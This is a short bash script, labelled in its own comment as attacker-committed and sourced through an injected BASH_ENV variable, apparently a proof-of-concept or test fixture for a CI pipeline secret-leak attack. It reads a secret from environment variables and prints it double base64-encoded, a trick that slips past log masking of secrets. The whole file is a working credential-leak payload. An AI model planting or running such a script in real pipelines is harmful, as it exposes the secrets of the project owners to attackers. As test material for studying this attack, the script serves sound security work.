#!/bin/bash
# Attacker-committed script; sourced by non-interactive bash via injected BASH_ENV.
LEAKED_SECRET="${GERALT_SECRET:-${GERALT:-}}"
echo "GERALT_LEAKED_TOKEN=$(echo -n "$LEAKED_SECRET" | base64 | base64)"
exit 0
